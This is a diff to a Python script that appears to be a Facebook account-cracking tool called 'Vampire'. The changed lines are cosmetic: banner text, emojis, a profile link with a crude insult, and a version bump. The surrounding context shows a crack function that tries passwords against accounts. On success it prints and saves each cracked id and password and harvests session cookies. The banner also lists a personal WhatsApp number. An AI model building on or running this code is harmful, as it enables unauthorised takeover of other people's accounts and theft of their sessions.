@@ -17,12 +17,12 @@ pretty.install()
 CON=sol()
  #------------------[ TONMOY  ]-------------------#
 import os, platform, time, sys
-print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mChecking Update...? ')
+print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;94mWELCOME TO VAMPIRE WORD-😈 ')
 time.sleep(5)
 os.system('clear')
-print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mFOLLOW MY FACEBOOK ACCOUNT")
+print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mFOLLOW MY FACEBOOK ACCOUNT👈")
 time.sleep(2)
-os.system(f'xdg-open https://www.facebook.com/MR.VAMPIRE.FB')
+os.system(f'xdg-open https://www.facebook.com/USER.AGENT.LUCIFER.JUSTIN.TONMOY.I.CAN.FcK.UR.MOM')
 #------------------[TONMOY ]-------------------#
 #------------------[ USER-AGENT ]-------------------#
 ua = ["Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36",]
@@ -186,13 +186,13 @@ def clear():
 def back():
     login()
 def contact():
-   # os.system('xdg-open https://www.facebook.com/MR.VAMPIRE.FB')
+   # os.system('xdg-open https://www.facebook.com/USER.AGENT.LUCIFER.JUSTIN.TONMOY.I.CAN.FcK.UR.MOM')
     back()
 def linex():
     print('\033[1;37m')
 def animation(u):
     for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
-os.system("xdg-open https://www.facebook.com/MR.VAMPIRE.FB")
+os.system("xdg-open https://www.facebook.com/USER.AGENT.LUCIFER.JUSTIN.TONMOY.I.CAN.FcK.UR.MOM")
 #------------------[ LOGO-LAKNAT ]-----------------#
 logo =""" 
 \033[97;1 _    _____    __  _______  ________  ______   
@@ -201,21 +201,21 @@ logo ="""
 \033[97;4| |/ / ___ |/ /  / / ____// // _, _/ /___      
 \033[97;5|___/_/  |_/_/  /_/_/   /___/_/ |_/_____/
 ╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
-║\33[0;60m        [ WORKING ONLY MOBILE DATA ]         \033[0;92m║
+║\33[0;70m        [ WORKING WI-FI/MOBILE DATA ]         \033[0;92m║
 ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
 \033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
-╠══[Author                   • \33[1;38mJUSTIN-TONMOY  ]\33[1;38m     ║\033[1;31m 
-╠══[Facebook                 • ニMR﹅VÄMPÎRË᭄ xニx ]   ║  \033[1;97m  
-╠══[Github                   • \33[1;38mjustinlucifer ]   ║\33[1;34m   
-╠══[Whatsapp                 • 01300161579 ]  ║\33[1;35m 
-╠══[TOOLS                    • FREE -ENJOY  ]         ║ \33[1;32m   
-╠══[VERSION                  • 1.0 ]          ║\033[1;35m 
+╠══[OWNER                    • \33[1;38mJUSTIN-TONMOY  ]\33[1;38m     ║\033[1;31m 
+╠══[FACEBOOK                 • VǢMPÏRÊ᭄ ゝ༺ʚĩɞ༻   ║  \033[1;97m  
+╠══[GITHUB                   • \33[1;38mjustinlucifer ]   ║\33[1;34m   
+╠══[WHATSAPP                 • 01300161579 ]  ║\33[1;35m 
+╠══[TOOLS                    • FREE-ENJOY  ]         ║ \33[1;32m   
+╠══[VERSION                  • 3.0 ]          ║\033[1;35m 
 \033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m"""
 os.system('clear')
 print(logo)
-os.system('espeak -a 400 " Your,   Real,  Name,"')
+os.system('espeak -a 400 " Your,   Original,  Name,"')
 uname =input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m WHAT IS YOUR NAME \033[1;91m: \33[1;32m')
-os.system('espeak -a 400 " Welcome,   to,  Vampire,  Tool"')
+os.system('espeak -a 400 " Welcome,   to,  Vampire,  world "')
 pass
  
  
@@ -644,7 +644,7 @@ def crack(idf,pwv):
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r\033[0;92m[VAMPIRE-OK💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
+                print(f'\r\033[0;92m[VAMPIRE-OK☢️] {idf} • {pw}\n\033[0;93m[💦]= COOKIES • \033[0;92m{kuki} ')
                 os.system('espeak -a 300 " Vampire,  Ok,  id"')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 break
